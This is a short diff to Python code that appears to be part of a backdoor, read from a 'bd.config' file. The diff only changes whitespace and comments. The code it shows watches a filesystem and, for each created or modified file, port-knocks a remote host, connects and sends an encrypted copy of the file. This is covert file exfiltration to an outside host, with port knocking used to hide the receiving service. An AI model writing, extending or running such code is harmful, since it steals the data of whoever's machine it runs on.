@@ -11,6 +11,7 @@ class FileSender(object):
     def __init__(self):
         config = ConfigParser.ConfigParser()
         config.read('./bd.config')
+
         self.sequence = config.get('FileMonitor', 'sequence').split(',')
         self.file_port = config.get('FileMonitor', 'file_port')
         self.remote_host = config.get('Setup', 'rhost')
@@ -20,9 +21,12 @@ class FileSender(object):
     def send_file(self, filename):
         knocker = PortKnocker(self.sequence, self.remote_host)
         knocker.knock()
+
         time.sleep(1)
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((self.remote_host, int(self.file_port)))
+
         enc = self.cipher.encrypt_file(filename)
 
         sock.sendall(enc)
@@ -36,7 +40,6 @@ class FSEventHandler(PatternMatchingEventHandler):
         self.sender = FileSender()
 
     def on_created(self, event):
-        # print('CREATED: ' + str(event))
         self.send_file(event.src_path)
 
     def on_modified(self, event):
@@ -44,7 +47,6 @@ class FSEventHandler(PatternMatchingEventHandler):
         if type(event) == DirModifiedEvent:
             return
 
-        # print('MODIFIED: ' + str(event))
         self.send_file(event.src_path)
 
     def send_file(self, filename):
